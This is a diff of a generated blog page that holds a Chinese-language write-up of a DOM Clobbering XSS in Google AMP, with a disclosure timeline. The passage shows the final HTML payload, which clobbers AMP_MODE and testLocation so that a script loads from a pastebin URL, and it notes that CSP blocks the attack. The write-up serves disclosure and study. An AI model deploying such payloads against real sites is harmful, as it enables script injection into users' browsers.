+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
+</span></span></code></pre></div><p>你还记得我们之前通过 DOM Clobbering 重载 <code>window.test1.test2</code> 的练习吗？现在我们需要做同样的事情，只要重载 <code>window.testLocation.protocol</code>。因此，最终的有效载荷：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AMP_MODE&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AMP_MODE&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;localDev&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AMP_MODE&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;testLocation&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;testLocation&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;protocol&#34;</span> 
+</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://pastebin.com/raw/0tn8z0rG#&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>实际上，由于在 AMP 中部署了 Content-Security-Policy，因此代码在实际情况下无法执行：</p>
+<pre tabindex="0"><code>Content-Security-Policy: default-src &#39;none&#39;; 
+script-src &#39;sha512-oQwIl...==&#39; 
   https://cdn.ampproject.org/rtv/ 
   https://cdn.ampproject.org/v0.js 
   https://cdn.ampproject.org/v0/
-</code></pre>
-
-<p>我没有找到绕过 CSP 的方法，但是在尝试绕过 CSP 时，我发现了一种绕过基于目录的 CSP的 有趣方法，并且<a href="https://twitter.com/SecurityMB/status/1162690916722839552">我在推特上发表了</a> （后来发现在 <a href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">2016年CTF中已经使用了相同的技巧</a>）。Google在其漏洞赏金计划中，实际上并不期望绕过 CSP 但依然支付全部赏金。这仍然是一个有趣的挑战。 也许其他人会找到绕过的方法 🙂</p>
-
+</code></pre><p>我没有找到绕过 CSP 的方法，但是在尝试绕过 CSP 时，我发现了一种绕过基于目录的 CSP的 有趣方法，并且<a href="https://twitter.com/SecurityMB/status/1162690916722839552">我在推特上发表了</a> （后来发现在 <a href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">2016年CTF中已经使用了相同的技巧</a>）。Google在其漏洞赏金计划中，实际上并不期望绕过 CSP 但依然支付全部赏金。这仍然是一个有趣的挑战。 也许其他人会找到绕过的方法 🙂</p>
 <h2 id="总结">总结</h2>
-
 <p>本文中，我已经展示了在满足某些条件的情况下如何使用 DOM Clobbering 执行XSS。这肯定是一个有趣的旅程！如果你想玩这些 XSS 练习，可以看看我的基于这种 XSS 的 XSS 挑战。</p>
-
 <h3 id="时间线">时间线</h3>
-
 <ul>
 <li>2019年8月15日 - 报告给谷歌</li>
 <li>2019年8月16日 - “nice catch!”，</li>
@@ -487,13 +433,13 @@ script-src 'sha512-oQwIl...=='
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>899</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>912</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
       <div id="disqus_thread"></div>
-<script>
-    var disqus_config = function () {
+<script type="application/javascript">
+    window.disqus_config = function () {
     
     
     
@@ -547,7 +493,7 @@ script-src 'sha512-oQwIl...=='
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
 
 
-<script>
+<script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
